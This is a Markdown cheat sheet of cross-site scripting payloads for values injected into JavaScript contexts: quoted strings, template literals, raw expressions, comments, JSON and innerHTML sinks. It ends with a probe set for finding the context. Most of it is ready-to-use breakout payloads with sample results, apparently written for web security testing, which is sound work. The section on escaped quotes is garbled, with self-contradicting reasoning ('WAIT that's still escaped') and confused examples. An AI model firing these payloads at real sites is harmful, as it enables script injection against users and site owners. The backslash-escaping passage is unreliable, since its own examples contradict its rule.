# JavaScript context — injection inside `<script>` blocks

The value lands inside a `<script>` tag — in a string, a template
literal, a comment, or as raw code. The quote semantics are JS, not
HTML: `"`/`'`/`` ` ``/escape-sequences matter differently.

```html
<script>
var x = "USER_INPUT";          -- double-quoted string
var y = 'USER_INPUT';          -- single-quoted
var z = `USER_INPUT`;           -- template literal
var n = USER_INPUT;             -- raw expression position
// USER_INPUT                   -- inside a line comment
/* USER_INPUT */                -- inside a block comment
x.innerHTML = "USER_INPUT";     -- JS-string → HTML sink (double ctx)
</script>
```

---

## 1. String-context escape — quote + operator

The input is inside `"..."` — a `"` closes the string, `;` starts a
statement:

```javascript
input:  ";alert(1);x="
result: var x = "";alert(1);x="";

input:  ";alert(1);//          -- line-comment eats the rest
input:  "};alert(1);//          -- closes object/if-brace too
input:  "-alert(1)-"            -- expression continuation
input:  "+alert(1)+"            -- concat variant
input:  "'+alert(1)+'"          -- cross-quote variant
```

Inside `'...'` — same with `'`.

### No-quote-needed continuations

```javascript
input:  -alert(1)-
result: var x = -alert(1)-"";    -- unary minus before/after — valid

input:  -alert(1)//
result: var x = -alert(1)//"";   -- comment eats the tail
```

---

## 2. Template-literal context — `${}` interpolation

The input is inside `` `...` `` — backticks delimit, but `${...}`
evaluates:

```javascript
input:  ${alert(1)}
result: var z = `${alert(1)}`;   -- alert runs during interpolation

input:  ${7*7}                   -- diagnostic: renders 49
input:  `${constructor.constructor('alert(1)')()}`  -- Function ctor
input:  `+alert(1)+`             -- concat escape
```

`${7*7}` → `49` in the response confirms template-eval. The
`${...}` interpolation IS expression position — any JS works inside.

---

## 3. Raw-expression context — no string at all

```javascript
var n = USER_INPUT;
  → alert(1)                      -- statement position
  → alert(1)//                    -- comment tail
  → 1;alert(1)                    -- separate statement
  → (alert(1))                    -- expression position — if the
                                     context is `if (USER_INPUT)`
  → location.hash.slice(1)        -- reads payload from URL
```

---

## 4. Comment contexts — `//` and `/* */`

```javascript
// USER_INPUT
  → newline + alert(1)//          -- can't inject newline in a
                                     line comment — dead unless
                                     %0A decoded to real newline
  → */alert(1);//                 -- try */ first in case of block

/* USER_INPUT */
  → */alert(1);//                 -- close the block, run, re-comment
  → */alert(1);/*                 -- close + reopen
```

`//` line comments are escape-only-by-newline — `%0a`/`%0d` inside
the value may decode to real newlines server-side:

```javascript
input:  test%0aalert(1)//
result: // test
        alert(1)//                 -- real newline breaks out!
```

---

## 5. String-escape bugs — when `"` is escaped as `\"`

The app escapes `"` to `\"` — the escape itself can be escaped:

```javascript
input:  \";alert(1);//
result: var x = "\\";alert(1);//";
        -- \" was meant to be literal — \\ gives literal backslash
           THEN the " after it is REAL — breakout!

input:  \\;alert(1);//
result: var x = "\\\";alert(1);//";
        -- two backslashes → literal \\, then " closes
```

The double-backslash trick — the app emits `\"` for each input `"`,
so you inject `\\"` → app makes `\\\"` → JS parses `\\` (literal
backslash) + `\"` (still escaped) — WAIT that's still escaped.

The correct chain: you inject `\"` → app makes `\\\"` → JS parses
`\\` (backslash char) + `"` (closing quote!) — the injected backslash
consumes the injected escape. So input `\"` breaks out when the
filter adds `\` before `"`.

The rule: inject `\` before your `"` — if the filter prepends `\`
to every `"`, yours becomes `\"` (escaped backslash) then `"` is
real. Test with `\"alert(1)` and `\\";alert(1);//`.

### Quote-agnostic escapes

```javascript
input:  ');alert(1);x=('
result: var y = '');alert(1);x=('';

input:  </script><svg onload=alert(1)>
result: var x = "</script><svg onload=alert(1)>";
        -- the literal </script> inside a JS string STILL closes
           the script block! HTML parser doesn't care about JS
           strings — it sees </script> and ends the block. The
           classic break — no quote needed
```

`</script>` inside a string is THE canonical escape — the HTML
parser terminates the script block regardless of JS string state.
Always try it:

```javascript
input:  </script><img src=x onerror=alert(1)>
input:  </ScRiPt><svg onload=alert(1)>      -- case variant for filters
input:  <\/script><img src=x onerror=alert(1)>  -- doesn't work —
                                                that's for ENCODING it
```

---

## 6. The `innerHTML`-via-JS double context

```javascript
el.innerHTML = "USER_INPUT";
  → the string becomes HTML — you need HTML in the JS string:
    <img src=x onerror=alert(1)>      -- as a JS string literal
    \"<img src=x onerror=alert(1)>\"   -- if " is the delimiter, need
                                        escaping... or use ' inside:
    <img src=x onerror=alert(1)>      -- ' is fine inside "..." 
    <img src=`x` onerror=alert(1)>    -- or backticks
```

innerHTML doesn't run `<script>` — use handler tags (img/svg).

---

## 7. Escaped-character tricks — JS string escapes

```javascript
// the app writes your " as \" — counter-input:
\"  → \\  →  "   -- your backslash consumes the added escape

// unicode escapes — if \u is left intact:
\u0022 — the " char  -- inside a string it's a literal char,
                     doesn't close — useless for escape
\u{22} — same
\x22  — same story

// BUT — a filter that passes \u0022 un-decoded as raw text:
input contains the literal backslash-u-0-0-2-2 chars → JS decodes
them → " — still literal, still doesn't close the string
(the decode happens INSIDE the string value — never structural)
```

JS escapes never close a string — they're processed as string
CONTENT. The only structural escapes are the raw `"`/`'`/`` ` ``
and `</script>`.

---

## 8. JSON-in-script context — `JSON.parse` or inline object

```javascript
var data = JSON.parse('USER_INPUT');
  → ');alert(1);//                 -- break out of the JS string
  → \\';alert(1);//                -- escape-the-escape variant
  → </script><img src=x onerror=alert(1)>  -- script-close

var cfg = {k: "USER_INPUT"};
  → ";alert(1);x="                 -- same string escape
  → "});alert(1);//                -- close the object too
```

---

## 9. Strict-mode and CSP interactions

If the page's own script is under CSP `nonce-x` — your injection
inside that script block still runs (the nonce covers the whole
block). `</script>` breakout creates a NEW script context that needs
its own nonce — prefer in-string escapes over `</script>` under CSP.

`'use strict'` doesn't block any of this — it restricts language
features, not injection.

---

## 10. The diagnostic probe set

```javascript
";alert(1);//            -- " context
';alert(1);//            -- ' context
`+alert(1)+`             -- ` context
${alert(1)}              -- template-interp context
-alert(1)-               -- expression context
*/alert(1);//            -- block-comment context
</script><img src=x onerror=alert(1)>   -- the universal escape
alert(1)                  -- raw-expression context
```

Test each — the one that doesn't error out names the context.
